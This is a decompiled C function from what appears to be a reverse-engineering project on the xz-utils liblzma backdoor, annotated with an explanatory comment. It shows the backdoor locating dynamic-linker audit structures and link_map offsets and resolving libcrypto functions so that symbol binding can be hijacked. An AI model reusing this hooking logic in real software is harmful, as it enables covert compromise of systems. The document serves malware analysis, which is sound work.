// /home/kali/xzre-ghidra/xzregh/1051E0_find_dl_audit_offsets.c
// Function: find_dl_audit_offsets @ 0x1051E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_audit_offsets(backdoor_data_handle_t * data, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Drives the full ld.so preparation sequence: resolves several EC/EVP helpers, maps
 * `_dl_audit_symbind_alt`, finds the `l_name` displacement, extracts `_dl_naudit/_dl_audit`, and
 * finally discovers the `l_audit_any_plt` byte plus its mask. It also copies the basename of
 * libcrypto into `hooks->ldso_ctx` so the forged link_map name matches the original string.
 */
#include "xzre_types.h"


BOOL find_dl_audit_offsets
               (backdoor_data_handle_t *data,ptrdiff_t *libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  uint uVar1;
  elf_info_t *peVar2;
  Elf64_Addr EVar3;
  Elf64_Ehdr *pEVar4;
  elf_handles_t *peVar5;
  u64 size;
  char **ppcVar6;
  char *pcVar7;
  BOOL BVar8;
  lzma_allocator *allocator;
  Elf64_Sym *pEVar9;
  _func_45 *p_Var10;
  _func_37 *p_Var11;
  _func_50 *p_Var12;
  long lVar13;
  uchar *vaddr;
  backdoor_hooks_data_t *pbVar14;
  byte bVar15;
  backdoor_hooks_data_t *hooks_ctx;
  _func_64 *audit_stub;
  lzma_allocator *libcrypto_allocator;
  
  bVar15 = 0;
  BVar8 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,0);
  if (BVar8 != 0) {
    allocator = get_lzma_allocator();
    peVar2 = data->elf_handles->libcrypto;
    allocator->opaque = peVar2;
    pEVar9 = elf_symbol_get(peVar2,STR_EC_POINT_point2oct,0);
    if (data->elf_handles->liblzma->gnurelro_found != 0) {
      if (pEVar9 != (Elf64_Sym *)0x0) {
        EVar3 = pEVar9->st_value;
        pEVar4 = data->elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_POINT_point2oct = (_func_35 *)(pEVar4->e_ident + EVar3);
      }
      p_Var10 = (_func_45 *)lzma_alloc(0x6f8,allocator);
      imported_funcs->EVP_PKEY_free = p_Var10;
      if (p_Var10 != (_func_45 *)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      pEVar9 = elf_symbol_get(data->elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
      p_Var11 = (_func_37 *)lzma_alloc(0x7e8,allocator);
      imported_funcs->EC_KEY_get0_group = p_Var11;
      if (p_Var11 != (_func_37 *)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      peVar5 = data->elf_handles;
      if (pEVar9 != (Elf64_Sym *)0x0) {
        EVar3 = pEVar9->st_value;
        pEVar4 = peVar5->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_KEY_get0_public_key = (_func_36 *)(pEVar4->e_ident + EVar3);
      }
      pEVar9 = elf_symbol_get(peVar5->dynamic_linker,STR_dl_audit_symbind_alt,0);
      if (pEVar9 != (Elf64_Sym *)0x0) {
        peVar2 = data->elf_handles->dynamic_linker;
        size = pEVar9->st_size;
        vaddr = peVar2->elfbase->e_ident + pEVar9->st_value;
        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
        (hooks->ldso_ctx)._dl_audit_symbind_alt = (_func_64 *)vaddr;
        BVar8 = elf_contains_vaddr(peVar2,vaddr,size,4);
        if ((BVar8 != 0) &&
           (BVar8 = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), BVar8 != 0)) {
          p_Var12 = (_func_50 *)lzma_alloc(0xb28,allocator);
          imported_funcs->EVP_CIPHER_CTX_free = p_Var12;
          if (p_Var12 != (_func_50 *)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          BVar8 = find_dl_naudit(data->elf_handles->dynamic_linker,data->elf_handles->libcrypto,
                                 hooks,imported_funcs);
          if ((BVar8 != 0) &&
             (BVar8 = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
             BVar8 != 0)) {
            pbVar14 = hooks;
            for (lVar13 = 0x10; lVar13 != 0; lVar13 = lVar13 + -1) {
              (pbVar14->ldso_ctx)._unknown1459[0] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[1] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[2] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[3] = '\0';
              pbVar14 = (backdoor_hooks_data_t *)((long)pbVar14 + (ulong)bVar15 * -8 + 4);
            }
            ppcVar6 = (hooks->ldso_ctx).libcrypto_l_name;
            uVar1 = *(uint *)(ppcVar6 + 1);
            if (uVar1 < 9) {
              if (uVar1 != 0) {
                pcVar7 = *ppcVar6;
                lVar13 = 0;
                do {
                  (hooks->ldso_ctx)._unknown1459[lVar13] = pcVar7[lVar13];
                  lVar13 = lVar13 + 1;
                } while ((ulong)uVar1 << 3 != lVar13);
              }
              return 1;
            }
          }
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_free,allocator);
    lzma_free(imported_funcs->EC_KEY_get0_group,allocator);
    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,allocator);
  }
  return 0;
}

